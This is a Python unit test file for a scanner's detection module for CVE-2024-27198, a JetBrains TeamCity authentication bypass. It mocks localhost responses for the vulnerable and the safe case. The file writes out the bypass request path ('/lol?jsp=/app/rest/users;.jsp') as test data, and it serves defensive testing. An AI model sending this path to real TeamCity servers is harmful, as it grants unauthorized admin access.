"""Unit tests for Agent Asteroid: CVE-2024-27198"""

import requests_mock as req_mock

from agent import definitions
from agent.exploits import cve_2024_27198


def testCVE202427198_whenVulnerable_reportFinding(
    requests_mock: req_mock.mocker.Mocker,
) -> None:
    """CVE-2024-27198 unit test: case when target is vulnerable."""
    requests_mock.get(
        "http://localhost:80/login.html",
        text="<title>Log in to TeamCity - TeamCity</title>",
        status_code=200,
    )
    requests_mock.get(
        "http://localhost:80/lol?jsp=/app/rest/users;.jsp",
        text='<users count="1"><user username="admin" id="1" href="/app/rest/users/id:1"/></users>',
        status_code=200,
    )
    exploit_instance = cve_2024_27198.CVE202427198Exploit()
    target = definitions.Target("http", "localhost", 80)

    accept = exploit_instance.accept(target)
    vulnerabilities = exploit_instance.check(target)

    assert accept is True
    vulnerability = vulnerabilities[0]
    assert vulnerability.entry.title == (
        "JetBrains TeamCity before 2023.11.4 authentication bypass allowing to "
        "perform admin actions"
    )
    assert vulnerability.technical_detail == (
        "http://localhost:80/ is vulnerable to CVE-2024-27198, JetBrains TeamCity "
        "before 2023.11.4 authentication bypass allowing to perform admin actions"
    )
    assert vulnerability.vulnerability_location is not None
    assert vulnerability.dna is not None


def testCVE202427198_whenSafe_reportNothing(
    requests_mock: req_mock.mocker.Mocker,
) -> None:
    """CVE-2024-27198 unit test: case when target is safe."""
    exploit_instance = cve_2024_27198.CVE202427198Exploit()
    requests_mock.get(
        "http://localhost:80/login.html",
        text="<title>Log in to TeamCity - TeamCity</title>",
        status_code=200,
    )
    requests_mock.get(
        "http://localhost:80/lol?jsp=/app/rest/users;.jsp",
        text="Check that the URL is correct.",
        status_code=404,
    )
    target = definitions.Target("http", "localhost", 80)

    accept = exploit_instance.accept(target)
    vulnerabilities = exploit_instance.check(target)

    assert accept is True
    assert len(vulnerabilities) == 0
